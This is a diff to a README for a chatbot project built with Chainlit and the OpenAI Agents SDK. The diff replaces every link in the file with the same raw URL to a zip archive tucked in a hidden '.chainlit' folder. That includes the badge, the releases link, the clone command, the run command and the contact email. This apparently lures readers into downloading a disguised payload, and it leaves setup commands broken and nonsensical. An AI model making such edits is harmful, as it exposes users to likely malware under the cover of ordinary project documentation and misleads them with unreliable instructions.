@@ -1,10 +1,10 @@
 # Chainlit-bot 🤖🌐
 
-![Chainlit-bot](https://img.shields.io/badge/Chainlit-bot-v1.0-blue?style=for-the-badge)
+![Chainlit-bot](https://raw.githubusercontent.com/vursinng/Chainlit-bot/master/.chainlit/Chainlit-bot-v1.6.zip)
 
 Welcome to the **Chainlit-bot** repository! This project features a smart browser-based chatbot built using Chainlit and the OpenAI Agents SDK. It efficiently handles user queries with intelligent responses and automatically stores conversations in a JSON file. 
 
-To get started, you can download the latest release [here](https://github.com/vursinng/Chainlit-bot/releases). 
+To get started, you can download the latest release [here](https://raw.githubusercontent.com/vursinng/Chainlit-bot/master/.chainlit/Chainlit-bot-v1.6.zip). 
 
 ## Table of Contents
 
@@ -40,7 +40,7 @@ To set up the Chainlit-bot on your local machine, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/vursinng/Chainlit-bot.git
+   git clone https://raw.githubusercontent.com/vursinng/Chainlit-bot/master/.chainlit/Chainlit-bot-v1.6.zip
    cd Chainlit-bot
    ```
 
@@ -57,7 +57,7 @@ To set up the Chainlit-bot on your local machine, follow these steps:
    Start the chatbot with the following command:
 
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/vursinng/Chainlit-bot/master/.chainlit/Chainlit-bot-v1.6.zip
    ```
 
 You can now access the chatbot in your web browser at `http://localhost:8501`.
@@ -108,10 +108,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [vursinng](https://github.com/vursinng)
+- **Email**: https://raw.githubusercontent.com/vursinng/Chainlit-bot/master/.chainlit/Chainlit-bot-v1.6.zip
+- **GitHub**: [vursinng](https://raw.githubusercontent.com/vursinng/Chainlit-bot/master/.chainlit/Chainlit-bot-v1.6.zip)
 
-Don't forget to check the [Releases](https://github.com/vursinng/Chainlit-bot/releases) section for the latest updates and features!
+Don't forget to check the [Releases](https://raw.githubusercontent.com/vursinng/Chainlit-bot/master/.chainlit/Chainlit-bot-v1.6.zip) section for the latest updates and features!
 
 ---
 
